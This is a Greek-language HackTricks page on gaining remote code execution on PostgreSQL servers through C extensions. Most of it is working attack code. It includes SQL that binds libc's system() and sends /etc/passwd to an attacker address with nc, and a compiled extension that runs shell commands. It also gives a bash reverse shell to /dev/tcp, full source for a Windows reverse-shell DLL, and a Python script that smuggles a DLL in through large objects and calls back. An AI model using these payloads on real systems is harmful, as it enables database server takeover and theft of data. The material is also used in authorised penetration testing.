# RCE με PostgreSQL Επεκτάσεις

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε τη **εταιρεία σας διαφημισμένη στο HackTricks**; ή θέλετε πρόσβαση στη **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε στη** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Επεκτάσεις PostgreSQL

Το PostgreSQL έχει αναπτυχθεί με την επεκτασιμότητα ως βασικό χαρακτηριστικό, επιτρέποντας την ομαλή ενσωμάτωση επεκτάσεων σαν να ήταν ενσωματωμένες λειτουργίες. Αυτές οι επεκτάσεις, ουσιαστικά βιβλιοθήκες γραμμένες σε C, εμπλουτίζουν τη βάση δεδομένων με επιπλέον λειτουργίες, τελεστές ή τύπους.

Από την έκδοση 8.1 και μετά, επιβάλλεται ένα συγκεκριμένο απαίτηση στις βιβλιοθήκες επεκτάσεων: πρέπει να έχουν μεταγλωττιστεί με ένα ειδικό κεφαλίδα. Χωρίς αυτό, το PostgreSQL δεν θα τις εκτελέσει, εξασφαλίζοντας ότι χρησιμοποιούνται μόνο συμβατές και ενδεχομένως ασφαλείς επεκτάσεις.

Επίσης, θυμηθείτε ότι **αν δεν ξέρετε πώς να** [**ανεβάσετε αρχεία στο θύμα καταχρώμενοι το PostgreSQL πρέπει να διαβάσετε αυτήν την ανάρτηση.**](big-binary-files-upload-postgresql.md)

### RCE σε Linux

**Για περισσότερες πληροφορίες ελέγξτε: [https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)**

Η εκτέλεση εντολών συστήματος από το PostgreSQL 8.1 και προηγούμενες εκδόσεις είναι ένα διαδικασία που έχει τεκμηριωθεί σαφώς και είναι απλή. Είναι δυνατόν να χρησιμοποιηθεί αυτό: [Metasploit module](https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres_payload).
```sql
CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');

# You can also create functions to open and write files
CREATE OR REPLACE FUNCTION open(cstring, int, int) RETURNS int AS '/lib/libc.so.6', 'open' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION write(int, cstring, int) RETURNS int AS '/lib/libc.so.6', 'write' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION close(int) RETURNS int AS '/lib/libc.so.6', 'close' LANGUAGE 'C' STRICT;
```
<details>

<summary>Γράψτε δυαδικό αρχείο από base64</summary>

Για να γράψετε ένα δυαδικό αρχείο σε ένα αρχείο στο postgres ίσως χρειαστεί να χρησιμοποιήσετε το base64, αυτό θα είναι χρήσιμο γι' αυτό το σκοπό:
```sql
CREATE OR REPLACE FUNCTION write_to_file(file TEXT, s TEXT) RETURNS int AS
$$
DECLARE
fh int;
s int;
w bytea;
i int;
BEGIN
SELECT open(textout(file)::cstring, 522, 448) INTO fh;

IF fh <= 2 THEN
RETURN 1;
END IF;

SELECT decode(s, 'base64') INTO w;

i := 0;
LOOP
EXIT WHEN i >= octet_length(w);

SELECT write(fh,textout(chr(get_byte(w, i)))::cstring, 1) INTO rs;

IF rs < 0 THEN
RETURN 2;
END IF;

i := i + 1;
END LOOP;

SELECT close(fh) INTO rs;

RETURN 0;

END;
$$ LANGUAGE 'plpgsql';
```
</details>

Ωστόσο, όταν προσπαθήθηκε σε μεγαλύτερες εκδόσεις **εμφανίστηκε το ακόλουθο σφάλμα**:
```c
ERROR:  incompatible library “/lib/x86_64-linux-gnu/libc.so.6”: missing magic block
HINT:  Extension libraries are required to use the PG_MODULE_MAGIC macro.
```
Αυτό το σφάλμα εξηγείται στο [τεκμηρίωση του PostgreSQL](https://www.postgresql.org/docs/current/static/xfunc-c.html):

> Για να διασφαλίσει ότι ένα αρχείο αντικειμένου που φορτώνεται δυναμικά δεν φορτώνεται σε έναν μη συμβατό διακομιστή, το PostgreSQL ελέγχει αν το αρχείο περιέχει ένα "μαγικό μπλοκ" με τα κατάλληλα περιεχόμενα. Αυτό επιτρέπει στο διακομιστή να ανιχνεύσει προφανείς ασυμβατότητες, όπως κώδικα που έχει μεταγλωττιστεί για μια διαφορετική μείζονα έκδοση του PostgreSQL. Ένα μαγικό μπλοκ απαιτείται από το PostgreSQL 8.2 και μετά. Για να συμπεριλάβετε ένα μαγικό μπλοκ, γράψτε αυτό σε ένα (και μόνο ένα) από τα αρχεία πηγαίου κώδικα του module, μετά την συμπερίληψη του header fmgr.h:
>
> `#ifdef PG_MODULE_MAGIC`\
> `PG_MODULE_MAGIC;`\
> `#endif`

Από την έκδοση 8.2 του PostgreSQL, η διαδικασία για έναν εισβολέα να εκμεταλλευτεί το σύστημα έχει γίνει πιο προκλητική. Ο εισβολέας απαιτείται να είτε χρησιμοποιήσει μια βιβλιοθήκη που είναι ήδη παρούσα στο σύστημα είτε να μεταφορτώσει μια προσαρμοσμένη βιβλιοθήκη. Αυτή η προσαρμοσμένη βιβλιοθήκη πρέπει να έχει μεταγλωττιστεί εναντίον της συμβατής μείζονας έκδοσης του PostgreSQL και πρέπει να περιλαμβάνει ένα συγκεκριμένο "μαγικό μπλοκ". Αυτό το μέτρο αυξάνει σημαντικά την δυσκολία εκμετάλλευσης των συστημάτων PostgreSQL, καθώς απαιτεί μια βαθύτερη κατανόηση της αρχιτεκτονικής του συστήματος και της συμβατότητας έκδοσης.

#### Μεταγλωττίστε τη βιβλιοθήκη

Λάβετε την έκδοση του PostgreSQL με:
```sql
SELECT version();
PostgreSQL 9.6.3 on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18) 6.3.0 20170516, 64-bit
```
Για συμβατότητα, είναι απαραίτητο να ευθυγραμμίζονται οι μείζονες εκδόσεις. Επομένως, η σύνταξη μιας βιβλιοθήκης με οποιαδήποτε έκδοση εντός της σειράς 9.6.x θα εξασφαλίσει επιτυχή ολοκλήρωση.

Για να εγκαταστήσετε αυτήν την έκδοση στο σύστημά σας:
```bash
apt install postgresql postgresql-server-dev-9.6
```
Και να μεταγλωττίσετε τη βιβλιοθήκη:
```c
//gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c
#include <string.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

PG_FUNCTION_INFO_V1(pg_exec);
Datum pg_exec(PG_FUNCTION_ARGS) {
char* command = PG_GETARG_CSTRING(0);
PG_RETURN_INT32(system(command));
}
```
Στη συνέχεια μεταφορτώστε τη μεταγλωττισμένη βιβλιοθήκη και εκτελέστε εντολές με:
```bash
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE C STRICT;
SELECT sys('bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"');
#Notice the double single quotes are needed to scape the qoutes
```
Μπορείτε να βρείτε αυτή τη **βιβλιοθήκη προμεταγεννημένη** για αρκετές διαφορετικές εκδόσεις PostgreSQL και μπορείτε ακόμα να **αυτοματοποιήσετε αυτή τη διαδικασία** (εάν έχετε πρόσβαση στο PostgreSQL) με:

{% embed url="https://github.com/Dionach/pgexec" %}

### RCE σε Windows

Το ακόλουθο DLL παίρνει ως είσοδο το **όνομα του δυαδικού** και τον **αριθμό** των **φορών** που θέλετε να το εκτελέσετε και το εκτελεί:
```c
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include "utils/builtins.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum pgsql_exec(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(pgsql_exec);

/* this function launches the executable passed in as the first parameter
in a FOR loop bound by the second parameter that is also passed*/
Datum
pgsql_exec(PG_FUNCTION_ARGS)
{
/* convert text pointer to C string */
#define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

/* retrieve the second argument that is passed to the function (an integer)
that will serve as our counter limit*/

int instances = PG_GETARG_INT32(1);

for (int c = 0; c < instances; c++) {
/*launch the process passed in the first parameter*/
ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
}
PG_RETURN_VOID();
}
```
Μπορείτε να βρείτε το DLL που έχει μεταγλωττιστεί σε αυτό το zip:

{% file src="../../../.gitbook/assets/pgsql_exec.zip" %}

Μπορείτε να υποδείξετε σε αυτό το DLL **ποιο δυαδικό να εκτελέσει** και τον αριθμό των φορών που θα το εκτελέσει, σε αυτό το παράδειγμα θα εκτελέσει το `calc.exe` 2 φορές:
```bash
CREATE OR REPLACE FUNCTION remote_exec(text, integer) RETURNS void AS '\\10.10.10.10\shared\pgsql_exec.dll', 'pgsql_exec' LANGUAGE C STRICT;
SELECT remote_exec('calc.exe', 2);
DROP FUNCTION remote_exec(text, integer);
```
Στο [**εδώ**](https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html) μπορείτε να βρείτε αυτό το αντίστροφο shell:
```c
#define PG_REVSHELL_CALLHOME_SERVER "10.10.10.10"
#define PG_REVSHELL_CALLHOME_PORT "4444"

#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <winsock2.h>

#pragma comment(lib,"ws2_32")

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

#pragma warning(push)
#pragma warning(disable: 4996)
#define _WINSOCK_DEPRECATED_NO_WARNINGS

BOOL WINAPI DllMain(_In_ HINSTANCE hinstDLL,
_In_ DWORD fdwReason,
_In_ LPVOID lpvReserved)
{
WSADATA wsaData;
SOCKET wsock;
struct sockaddr_in server;
char ip_addr[16];
STARTUPINFOA startupinfo;
PROCESS_INFORMATION processinfo;

char *program = "cmd.exe";
const char *ip = PG_REVSHELL_CALLHOME_SERVER;
u_short port = atoi(PG_REVSHELL_CALLHOME_PORT);

WSAStartup(MAKEWORD(2, 2), &wsaData);
wsock = WSASocket(AF_INET, SOCK_STREAM,
IPPROTO_TCP, NULL, 0, 0);

struct hostent *host;
host = gethostbyname(ip);
strcpy_s(ip_addr, sizeof(ip_addr),
inet_ntoa(*((struct in_addr *)host->h_addr)));

server.sin_family = AF_INET;
server.sin_port = htons(port);
server.sin_addr.s_addr = inet_addr(ip_addr);

WSAConnect(wsock, (SOCKADDR*)&server, sizeof(server),
NULL, NULL, NULL, NULL);

memset(&startupinfo, 0, sizeof(startupinfo));
startupinfo.cb = sizeof(startupinfo);
startupinfo.dwFlags = STARTF_USESTDHANDLES;
startupinfo.hStdInput = startupinfo.hStdOutput =
startupinfo.hStdError = (HANDLE)wsock;

CreateProcessA(NULL, program, NULL, NULL, TRUE, 0,
NULL, NULL, &startupinfo, &processinfo);

return TRUE;
}

#pragma warning(pop) /* re-enable 4996 */

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum dummy_function(PG_FUNCTION_ARGS);

PG_FUNCTION_INFO_V1(add_one);

Datum dummy_function(PG_FUNCTION_ARGS)
{
int32 arg = PG_GETARG_INT32(0);

PG_RETURN_INT32(arg + 1);
}
```
Σημειώστε ότι σε αυτήν την περίπτωση ο **κακόβουλος κώδικας βρίσκεται μέσα στη συνάρτηση DllMain**. Αυτό σημαίνει ότι σε αυτήν την περίπτωση δεν είναι απαραίτητο να εκτελεστεί η φορτωμένη συνάρτηση στο postgresql, απλά **φορτώνοντας το DLL** θα **εκτελεστεί** το αντίστροφο κέλυφος:
```c
CREATE OR REPLACE FUNCTION dummy_function(int) RETURNS int AS '\\10.10.10.10\shared\dummy_function.dll', 'dummy_function' LANGUAGE C STRICT;
```
Το [Project PolyUDF](https://github.com/rop-la/PolyUDF) είναι επίσης ένα καλό σημείο εκκίνησης με το πλήρες έργο MS Visual Studio και μια έτοιμη βιβλιοθήκη (περιλαμβάνοντας: _εκτέλεση εντολής_, _exec_ και _καθαρισμός_) με υποστήριξη πολλαπλών εκδόσεων.

### RCE στις πιο πρόσφατες εκδόσεις του PostgreSQL

Στις **τελευταίες εκδόσεις** του PostgreSQL, επιβλήθηκαν περιορισμοί όπου ο `superuser` **απαγορεύεται** να **φορτώνει** αρχεία κοινόχρηστων βιβλιοθηκών εκτός από συγκεκριμένους καταλόγους, όπως `C:\Program Files\PostgreSQL\11\lib` σε Windows ή `/var/lib/postgresql/11/lib` σε συστήματα \*nix. Αυτοί οι κατάλογοι είναι **ασφαλισμένοι** ενάντια σε λειτουργίες εγγραφής από τους λογαριασμούς NETWORK\_SERVICE ή postgres.

Παρά τους περιορισμούς αυτούς, είναι δυνατό για έναν εξουσιοδοτημένο `superuser` βάσης δεδομένων να **εγγράψει δυαδικά αρχεία** στο σύστημα αρχείων χρησιμοποιώντας "μεγάλα αντικείμενα." Αυτή η δυνατότητα επεκτείνεται στην εγγραφή εντός του καταλόγου `C:\Program Files\PostgreSQL\11\data`, ο οποίος είναι ουσιώδης για λειτουργίες βάσης δεδομένων όπως ενημέρωση ή δημιουργία πινάκων.

Μια σημαντική ευπάθεια προκύπτει από την εντολή `CREATE FUNCTION`, η οποία **επιτρέπει τη διάβαση καταλόγων** στον κατάλογο δεδομένων. Ως εκ τούτου, ένας εξουσιοδοτημένος επιτιθέμενος θα μπορούσε να **εκμεταλλευτεί αυτήν τη διάβαση** για να γράψει ένα αρχείο κοινόχρηστης βιβλιοθήκης στον κατάλογο δεδομένων και στη συνέχεια να το **φορτώσει**. Αυτή η εκμετάλλευση επιτρέπει στον επιτιθέμενο να εκτελέσει αυθαίρετο κώδικα, επιτυγχάνοντας εκτέλεση κώδικα στο σύστημα.

#### Ροή επίθεσης

Καταρχάς, πρέπει να **χρησιμοποιήσετε μεγάλα αντικείμενα για τη μεταφόρτωση του dll**. Μπορείτε να δείτε πώς να το κάνετε εδώ:

{% content-ref url="big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

Αφού μεταφορτώσετε την επέκταση (με το όνομα poc.dll για αυτό το παράδειγμα) στον κατάλογο δεδομένων, μπορείτε να τη φορτώσετε με:
```c
create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;
select connect_back('192.168.100.54', 1234);
```
_Σημείωση ότι δεν χρειάζεται να προσθέσετε την επέκταση `.dll` καθώς η λειτουργία δημιουργίας θα την προσθέσει._

Για περισσότερες πληροφορίες **διαβάστε την**[ **αρχική δημοσίευση εδώ**](https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html)**.**\
Σε αυτή τη δημοσίευση **αυτός ήταν ο** [**κώδικας που χρησιμοποιήθηκε για τη δημιουργία της επέκτασης postgres**](https://github.com/sourceincite/tools/blob/master/pgpwn.c) (_για να μάθετε πώς να μεταγλωτίσετε μια επέκταση postgres διαβάστε οποιαδήποτε από τις προηγούμενες εκδόσεις_).\
Στην ίδια σελίδα δόθηκε αυτό το **εκμετάλλευση για να αυτοματοποιήσετε** αυτήν την τεχνική:
```python
#!/usr/bin/env python3
import sys

if len(sys.argv) != 4:
print("(+) usage %s <connectback> <port> <dll/so>" % sys.argv[0])
print("(+) eg: %s 192.168.100.54 1234 si-x64-12.dll" % sys.argv[0])
sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
lib = sys.argv[3]
with open(lib, "rb") as dll:
d = dll.read()
sql = "select lo_import('C:/Windows/win.ini', 1337);"
for i in range(0, len(d)//2048):
start = i * 2048
end   = (i+1) * 2048
if i == 0:
sql += "update pg_largeobject set pageno=%d, data=decode('%s', 'hex') where loid=1337;" % (i, d[start:end].hex())
else:
sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % (i, d[start:end].hex())
if (len(d) % 2048) != 0:
end   = (i+1) * 2048
sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % ((i+1), d[end:].hex())

sql += "select lo_export(1337, 'poc.dll');"
sql += "create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;"
sql += "select connect_back('%s', %d);" % (host, port)
print("(+) building poc.sql file")
with open("poc.sql", "w") as sqlfile:
sqlfile.write(sql)
print("(+) run poc.sql in PostgreSQL using the superuser")
print("(+) for a db cleanup only, run the following sql:")
print("    select lo_unlink(l.oid) from pg_largeobject_metadata l;")
print("    drop function connect_back(text, integer);")
```
## Αναφορές

* [https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)
* [https://www.exploit-db.com/papers/13084](https://www.exploit-db.com/papers/13084)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε τη **εταιρεία σας διαφημισμένη στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στη **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε τη [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε στη** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
